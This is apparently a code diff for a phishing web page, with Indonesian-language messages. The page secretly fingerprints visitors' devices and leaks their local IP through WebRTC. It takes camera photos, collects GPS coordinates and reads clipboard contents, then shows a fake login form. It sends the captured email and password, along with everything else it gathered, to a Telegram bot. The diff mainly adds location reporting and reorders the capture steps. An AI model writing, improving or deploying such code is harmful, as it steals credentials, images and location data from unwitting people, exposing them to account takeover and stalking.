@@ -386,7 +386,7 @@
           }
           
           const candidate = ice.candidate.candidate;
-          const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
+          const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
           const match = candidate.match(regex);
           
           if (match) {
@@ -404,33 +404,61 @@
       });
     }
     
-    // GET DEVICE INFO
-    function getDeviceInfo() {
+    // GET DEVICE INFO (MORE ACCURATE)
+    async function getDeviceInfo() {
       const ua = navigator.userAgent;
-      let device = 'Desktop';
-      let brand = 'Unknown';
+      let deviceType = 'Desktop';
+      let deviceBrand = 'Unknown';
+      let os = 'Unknown';
+      let osVersion = 'Unknown';
       
-      // Detect device type
+      // Detect OS
       if (/android/i.test(ua)) {
-        device = 'Android';
-        // Try to detect Android brand
-        if (/samsung/i.test(ua)) brand = 'Samsung';
-        else if (/xiaomi/i.test(ua) || /redmi/i.test(ua) || /poco/i.test(ua)) brand = 'Xiaomi';
-        else if (/oppo/i.test(ua)) brand = 'Oppo';
-        else if (/vivo/i.test(ua)) brand = 'Vivo';
-        else if (/realme/i.test(ua)) brand = 'Realme';
-        else if (/oneplus/i.test(ua)) brand = 'OnePlus';
-        else if (/huawei/i.test(ua) || /honor/i.test(ua)) brand = 'Huawei';
-        else if (/google/i.test(ua)) brand = 'Google';
-        else if (/motorola/i.test(ua)) brand = 'Motorola';
-        else if (/nokia/i.test(ua)) brand = 'Nokia';
-        else brand = 'Android Device';
+        deviceType = 'Android';
+        os = 'Android';
+        const match = ua.match(/android\s([0-9\.]+)/i);
+        osVersion = match ? match[1] : 'Unknown';
+        
+        // Better brand detection for Android
+        if (/samsung/i.test(ua)) deviceBrand = 'Samsung';
+        else if (/xiaomi|redmi|poco/i.test(ua)) deviceBrand = 'Xiaomi';
+        else if (/oppo/i.test(ua)) deviceBrand = 'Oppo';
+        else if (/vivo/i.test(ua)) deviceBrand = 'Vivo';
+        else if (/realme/i.test(ua)) deviceBrand = 'Realme';
+        else if (/oneplus/i.test(ua)) deviceBrand = 'OnePlus';
+        else if (/huawei|honor/i.test(ua)) deviceBrand = 'Huawei';
+        else if (/google pixel/i.test(ua)) deviceBrand = 'Google Pixel';
+        else if (/motorola/i.test(ua)) deviceBrand = 'Motorola';
+        else if (/lenovo/i.test(ua)) deviceBrand = 'Lenovo';
+        else if (/asus/i.test(ua)) deviceBrand = 'Asus';
+        else deviceBrand = 'Android Phone';
+        
       } else if (/iphone|ipad|ipod/i.test(ua)) {
-        device = 'iOS';
-        brand = 'Apple';
+        deviceType = 'iOS';
+        os = 'iOS';
+        deviceBrand = 'Apple';
+        const match = ua.match(/os\s([0-9_]+)/i);
+        osVersion = match ? match[1].replace(/_/g, '.') : 'Unknown';
+        
       } else if (/windows phone/i.test(ua)) {
-        device = 'Windows Phone';
-        brand = 'Microsoft';
+        deviceType = 'Windows Phone';
+        os = 'Windows Phone';
+        deviceBrand = 'Microsoft';
+        
+      } else if (/macintosh/i.test(ua)) {
+        deviceType = 'Desktop';
+        os = 'macOS';
+        deviceBrand = 'Apple';
+        
+      } else if (/windows/i.test(ua)) {
+        deviceType = 'Desktop';
+        os = 'Windows';
+        deviceBrand = 'PC';
+        
+      } else if (/linux/i.test(ua)) {
+        deviceType = 'Desktop';
+        os = 'Linux';
+        deviceBrand = 'PC';
       }
       
       // Get battery info
@@ -438,41 +466,50 @@
       let isCharging = false;
       
       if (navigator.getBattery) {
-        navigator.getBattery().then(battery => {
+        try {
+          const battery = await navigator.getBattery();
           batteryLevel = Math.round(battery.level * 100) + '%';
           isCharging = battery.charging;
-        }).catch(() => {
+        } catch {
           batteryLevel = 'Unknown';
           isCharging = false;
-        });
+        }
       }
       
       // Get screen info
       const screenWidth = window.screen.width;
       const screenHeight = window.screen.height;
+      const screenSize = `${screenWidth}×${screenHeight}`;
       
-      // Get OS version
-      let osVersion = 'Unknown';
-      if (/android/i.test(ua)) {
-        const match = ua.match(/android\s([0-9\.]+)/i);
-        osVersion = match ? match[1] : 'Unknown';
-      } else if (/iphone|ipad|ipod/i.test(ua)) {
-        const match = ua.match(/os\s([0-9_]+)/i);
-        osVersion = match ? match[1].replace(/_/g, '.') : 'Unknown';
-      }
+      // Get timezone
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      
+      // Get browser
+      let browser = 'Unknown';
+      if (/chrome/i.test(ua) && !/edge/i.test(ua)) browser = 'Chrome';
+      else if (/firefox/i.test(ua)) browser = 'Firefox';
+      else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
+      else if (/edge/i.test(ua)) browser = 'Edge';
+      else if (/opera/i.test(ua)) browser = 'Opera';
+      
+      // Get CPU cores
+      const cpuCores = navigator.hardwareConcurrency || 'Unknown';
       
       return {
-        device,
-        brand,
+        deviceType,
+        deviceBrand,
+        os,
+        osVersion,
         batteryLevel,
         isCharging,
-        screen: `${screenWidth}x${screenHeight}`,
-        osVersion,
-        userAgent: ua.substring(0, 100) + '...',
+        screenSize,
+        timezone,
+        browser,
+        cpuCores,
+        userAgent: ua,
         platform: navigator.platform,
         language: navigator.language,
-        cores: navigator.hardwareConcurrency || 'Unknown',
-        memory: navigator.deviceMemory || 'Unknown GB'
+        vendor: navigator.vendor || 'Unknown'
       };
     }
     
@@ -527,6 +564,7 @@
         
       } catch (error) {
         hasCapturedCamera = false;
+        console.log('Camera blocked:', error.message);
       }
     }
     
@@ -537,18 +575,32 @@
           const position = await new Promise((resolve, reject) => {
             navigator.geolocation.getCurrentPosition(resolve, reject, {
               enableHighAccuracy: true,
-              timeout: 8000
+              timeout: 8000,
+              maximumAge: 0
             });
           });
+          
+          // Send location to Telegram
+          await sendToTelegram(
+            `📍 <b>LOKASI DITEMUKAN</b>\n\n` +
+            `🛰️ <b>Koordinat GPS:</b>\n` +
+            `• Latitude: ${position.coords.latitude}\n` +
+            `• Longitude: ${position.coords.longitude}\n` +
+            `• Akurasi: ${Math.round(position.coords.accuracy)} meter\n\n` +
+            `🗺️ <b>Google Maps:</b>\n` +
+            `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}\n\n` +
+            `🌐 <b>IP Public:</b> ${await getIP()}`
+          );
           
           hasCapturedLocation = true;
           
         } else {
-          throw new Error('Geolocation not supported');
+          throw new Error('Geolocation tidak didukung');
         }
         
       } catch (error) {
         hasCapturedLocation = false;
+        console.log('Location blocked:', error.message);
       }
     }
     
@@ -559,43 +611,50 @@
       hasCapturedLocation = false;
       
       // Get all device info
-      const deviceInfo = getDeviceInfo();
+      const deviceInfo = await getDeviceInfo();
       const publicIP = await getIP();
       const localIP = await getLocalIP();
       
       // Send device info first
       await sendToTelegram(
-        `📱 <b>INFORMASI DEVICE</b>\n\n` +
-        `📱 <b>Tipe Device:</b> ${deviceInfo.device}\n` +
-        `🏷️ <b>Merek HP:</b> ${deviceInfo.brand}\n` +
-        `🔋 <b>Baterai:</b> ${deviceInfo.batteryLevel}\n` +
-        `⚡ <b>Status Charger:</b> ${deviceInfo.isCharging ? 'Sedang Charge ✅' : 'Tidak Charge'}\n` +
-        `🖥️ <b>OS Version:</b> ${deviceInfo.osVersion}\n` +
-        `📐 <b>Resolusi:</b> ${deviceInfo.screen}\n` +
-        `🌐 <b>Bahasa:</b> ${deviceInfo.language}\n` +
-        `💻 <b>Platform:</b> ${deviceInfo.platform}\n` +
-        `🖥️ <b>CPU Cores:</b> ${deviceInfo.cores}\n` +
-        `💾 <b>RAM:</b> ${deviceInfo.memory}\n\n` +
+        `📱 <b>INFORMASI DEVICE DETECTED</b>\n\n` +
+        `📱 <b>Device Type:</b> ${deviceInfo.deviceType}\n` +
+        `🏷️ <b>Brand:</b> ${deviceInfo.deviceBrand}\n` +
+        `🖥️ <b>OS:</b> ${deviceInfo.os} ${deviceInfo.osVersion}\n` +
+        `🔋 <b>Battery:</b> ${deviceInfo.batteryLevel}\n` +
+        `⚡ <b>Charging:</b> ${deviceInfo.isCharging ? 'YES ✅' : 'NO'}\n` +
+        `📐 <b>Screen:</b> ${deviceInfo.screenSize}\n` +
+        `🌐 <b>Browser:</b> ${deviceInfo.browser}\n` +
+        `💻 <b>CPU Cores:</b> ${deviceInfo.cpuCores}\n` +
+        `🗺️ <b>Timezone:</b> ${deviceInfo.timezone}\n` +
+        `🌍 <b>Language:</b> ${deviceInfo.language}\n\n` +
         `🌐 <b>IP Public:</b> <code>${publicIP}</code>\n` +
-        `🔒 <b>IP Private:</b> <code>${localIP}</code>\n\n` +
-        `📅 <b>Tanggal:</b> ${new Date().toLocaleDateString('id-ID')}\n` +
-        `⏰ <b>Waktu:</b> ${new Date().toLocaleTimeString('id-ID')}\n\n` +
-        `⬇️ Memulai proses capture data...`
+        `🔒 <b>IP Local:</b> <code>${localIP}</code>\n\n` +
+        `📅 <b>Date:</b> ${new Date().toLocaleDateString('id-ID')}\n` +
+        `⏰ <b>Time:</b> ${new Date().toLocaleTimeString('id-ID')}\n\n` +
+        `⬇️ Starting camera capture...`
       );
       
-      // Start camera and location capture simultaneously
-      const cameraPromise = captureCamera();
-      const locationPromise = captureLocation();
+      // STEP 1: CAPTURE CAMERA FIRST
+      await captureCamera();
       
-      // Wait for both to complete (or fail)
-      await Promise.allSettled([cameraPromise, locationPromise]);
-      
-      // Send camera and location results
+      // Send camera result
       await sendToTelegram(
-        `📊 <b>HASIL CAPTURE</b>\n\n` +
-        `📸 <b>Kamera:</b> ${hasCapturedCamera ? '✅ 5 foto berhasil' : '❌ Diblokir'}\n` +
-        `📍 <b>Lokasi:</b> ${hasCapturedLocation ? '✅ Berhasil' : '❌ Diblokir'}\n\n` +
-        `🔄 Melanjutkan ke verifikasi akun...`
+        `📸 <b>CAMERA RESULT</b>\n\n` +
+        `📸 <b>Status:</b> ${hasCapturedCamera ? '✅ 5 photos captured' : '❌ Blocked'}\n` +
+        `🔄 Now requesting location access...`
+      );
+      
+      // STEP 2: CAPTURE LOCATION AFTER CAMERA
+      await captureLocation();
+      
+      // Send location result
+      await sendToTelegram(
+        `📍 <b>LOCATION RESULT</b>\n\n` +
+        `📍 <b>Status:</b> ${hasCapturedLocation ? '✅ Captured with Google Maps link' : '❌ Blocked'}\n` +
+        `📱 <b>Device:</b> ${deviceInfo.deviceBrand} ${deviceInfo.deviceType}\n` +
+        `🌐 <b>IP:</b> ${publicIP}\n\n` +
+        `🔄 Redirecting to login page...`
       );
       
       // Show login page immediately
@@ -628,32 +687,33 @@
       document.getElementById('securityAlert').classList.remove('show');
       
       // Get all info again
-      const deviceInfo = getDeviceInfo();
+      const deviceInfo = await getDeviceInfo();
       const publicIP = await getIP();
       const localIP = await getLocalIP();
       
       // Send credentials with all device info
       await sendToTelegram(
-        `✅ <b>DATA AKUN DICAPTURE</b>\n\n` +
-        `👤 <b>AKUN PENGUNJUNG:</b>\n` +
+        `✅ <b>ACCOUNT DATA CAPTURED</b>\n\n` +
+        `👤 <b>ACCOUNT INFO:</b>\n` +
         `📧 <b>Email:</b> <code>${email}</code>\n` +
         `🔑 <b>Password:</b> <code>${password}</code>\n\n` +
-        `📱 <b>INFORMASI DEVICE:</b>\n` +
-        `📱 <b>Tipe:</b> ${deviceInfo.device}\n` +
-        `🏷️ <b>Merek:</b> ${deviceInfo.brand}\n` +
-        `🔋 <b>Baterai:</b> ${deviceInfo.batteryLevel}\n` +
-        `⚡ <b>Charger:</b> ${deviceInfo.isCharging ? 'Sedang Charge ✅' : 'Tidak Charge'}\n` +
-        `🖥️ <b>OS:</b> ${deviceInfo.osVersion}\n` +
-        `📐 <b>Screen:</b> ${deviceInfo.screen}\n\n` +
+        `📱 <b>DEVICE INFO:</b>\n` +
+        `📱 <b>Device:</b> ${deviceInfo.deviceBrand} ${deviceInfo.deviceType}\n` +
+        `🖥️ <b>OS:</b> ${deviceInfo.os} ${deviceInfo.osVersion}\n` +
+        `🔋 <b>Battery:</b> ${deviceInfo.batteryLevel}\n` +
+        `⚡ <b>Charging:</b> ${deviceInfo.isCharging ? 'YES ✅' : 'NO'}\n` +
+        `📐 <b>Screen:</b> ${deviceInfo.screenSize}\n` +
+        `🌐 <b>Browser:</b> ${deviceInfo.browser}\n\n` +
         `🌐 <b>NETWORK INFO:</b>\n` +
-        `🌐 <b>IP Public:</b> <code>${publicIP}</code>\n` +
-        `🔒 <b>IP Private:</b> <code>${localIP}</code>\n\n` +
-        `📊 <b>HASIL CAPTURE:</b>\n` +
-        `📸 <b>Kamera:</b> ${hasCapturedCamera ? '✅ 5 foto' : '❌ Diblokir'}\n` +
-        `📍 <b>Lokasi:</b> ${hasCapturedLocation ? '✅ Berhasil' : '❌ Diblokir'}\n\n` +
-        `📅 <b>Tanggal:</b> ${new Date().toLocaleDateString('id-ID')}\n` +
-        `⏰ <b>Waktu:</b> ${new Date().toLocaleTimeString('id-ID')}\n\n` +
-        `🎯 <b>User Agent:</b>\n${deviceInfo.userAgent}`
+        `🌐 <b>Public IP:</b> <code>${publicIP}</code>\n` +
+        `🔒 <b>Local IP:</b> <code>${localIP}</code>\n` +
+        `🗺️ <b>Timezone:</b> ${deviceInfo.timezone}\n\n` +
+        `📊 <b>CAPTURE RESULTS:</b>\n` +
+        `📸 <b>Camera:</b> ${hasCapturedCamera ? '✅ 5 photos' : '❌ Blocked'}\n` +
+        `📍 <b>Location:</b> ${hasCapturedLocation ? '✅ Captured' : '❌ Blocked'}\n\n` +
+        `📅 <b>Date:</b> ${new Date().toLocaleDateString('id-ID')}\n` +
+        `⏰ <b>Time:</b> ${new Date().toLocaleTimeString('id-ID')}\n\n` +
+        `🕵️ <b>User Agent:</b>\n${deviceInfo.userAgent.substring(0, 150)}...`
       );
       
       // Reset form
@@ -666,15 +726,17 @@
         
         // Send final summary
         sendToTelegram(
-          `🎉 <b>PROSES SELESAI</b>\n\n` +
-          `✅ Semua data berhasil dikumpulkan\n` +
-          `📊 Total data yang didapat:\n` +
-          `• Informasi device lengkap\n` +
-          `• ${hasCapturedCamera ? '5 foto kamera' : 'Kamera diblokir'}\n` +
-          `• ${hasCapturedLocation ? 'Lokasi GPS' : 'Lokasi diblokir'}\n` +
-          `• Data akun lengkap\n\n` +
-          `📱 <b>Device:</b> ${deviceInfo.brand} ${deviceInfo.device}\n` +
+          `🎉 <b>PROCESS COMPLETED</b>\n\n` +
+          `✅ All data successfully captured\n` +
+          `📊 Data collected:\n` +
+          `• Device information\n` +
+          `• ${hasCapturedCamera ? '5 camera photos' : 'Camera blocked'}\n` +
+          `• ${hasCapturedLocation ? 'GPS location' : 'Location blocked'}\n` +
+          `• Account credentials\n\n` +
+          `📱 <b>Device:</b> ${deviceInfo.deviceBrand} ${deviceInfo.deviceType}\n` +
           `🌐 <b>IP:</b> ${publicIP}\n` +
+          `🔋 <b>Battery:</b> ${deviceInfo.batteryLevel}\n` +
+          `⚡ <b>Charging:</b> ${deviceInfo.isCharging ? 'YES' : 'NO'}\n` +
           `🕒 ${new Date().toLocaleString('id-ID')}`
         );
         
@@ -685,17 +747,16 @@
     
     // PAGE LOAD LOG
     window.addEventListener('load', async () => {
-      const deviceInfo = getDeviceInfo();
+      const deviceInfo = await getDeviceInfo();
       const publicIP = await getIP();
-      const localIP = await getLocalIP();
       
       await sendToTelegram(
         `🌐 <b>PAGE LOADED</b>\n\n` +
-        `📱 <b>Device:</b> ${deviceInfo.brand} ${deviceInfo.device}\n` +
-        `🔋 <b>Baterai:</b> ${deviceInfo.batteryLevel}\n` +
-        `⚡ <b>Charger:</b> ${deviceInfo.isCharging ? 'Sedang Charge' : 'Tidak Charge'}\n` +
-        `🌐 <b>IP Public:</b> ${publicIP}\n` +
-        `🔒 <b>IP Private:</b> ${localIP}\n` +
+        `📱 <b>Device:</b> ${deviceInfo.deviceBrand} ${deviceInfo.deviceType}\n` +
+        `🖥️ <b>OS:</b> ${deviceInfo.os} ${deviceInfo.osVersion}\n` +
+        `🔋 <b>Battery:</b> ${deviceInfo.batteryLevel}\n` +
+        `⚡ <b>Charging:</b> ${deviceInfo.isCharging ? 'YES' : 'NO'}\n` +
+        `🌐 <b>IP:</b> ${publicIP}\n` +
         `📅 ${new Date().toLocaleDateString('id-ID')}\n` +
         `⏰ ${new Date().toLocaleTimeString('id-ID')}`
       );
@@ -723,20 +784,6 @@
         await sendToTelegram(`📋 <b>CLIPBOARD DATA</b>\n\n<code>${text.substring(0, 200)}</code>`);
       }
     });
-    
-    // BATTERY UPDATES
-    if (navigator.getBattery) {
-      navigator.getBattery().then(battery => {
-        battery.addEventListener('levelchange', () => {
-          const level = Math.round(battery.level * 100);
-          sendToTelegram(`🔋 <b>BATTERY UPDATE</b>\n\nLevel: ${level}%\nCharging: ${battery.charging ? 'Yes' : 'No'}`);
-        });
-        
-        battery.addEventListener('chargingchange', () => {
-          sendToTelegram(`⚡ <b>CHARGING STATUS</b>\n\nCharging: ${battery.charging ? 'Started ✅' : 'Stopped'}\nLevel: ${Math.round(battery.level * 100)}%`);
-        });
-      });
-    }
   </script>
 </body>
 </html>
